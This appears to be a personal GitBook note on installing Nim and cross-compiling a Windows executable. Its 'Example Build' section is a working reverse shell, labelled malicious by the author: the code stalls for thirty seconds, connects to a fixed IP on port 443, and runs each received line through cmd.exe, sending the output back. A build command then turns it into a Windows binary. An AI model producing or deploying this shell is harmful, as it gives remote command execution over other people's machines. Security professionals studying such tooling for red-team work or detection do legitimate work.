---
description: 05-11-2023
---

# Nim

## Installation

```
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
```

chown:

```
sudo chown -R $(whoami) /opt/homebrew/Cellar/mingw-w64/11.0.0/
```

Add to PATH:

```
fish_add_path /opt/homebrew/bin/
export PATH=/opt/homebrew/bin/
```

## Example Build

test.nim (malicious socket code):

```
import net, osproc, strformat, times

let now1 = now() + 30.seconds
var i = 1

while now() <= now1:
    var i = i + 1

let
    ip = "192.168.1.119"
    port = 443
    sock = newSocket()

sock.connect(ip, Port(port))

let prompt = "Nim-Shell> "
while true:
    send(sock, prompt)
    let bad = recvLine(sock)
    let cmd = execProcess(fmt"cmd.exe /C " & bad)
    send(sock, cmd)
```

Build:

```
nim c -d:x86_64-w64-mingw32-gcc test.nim
```

You should then see <mark style="color:blue;">**SuccessX**</mark>:

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

You will then have an executable test binary.
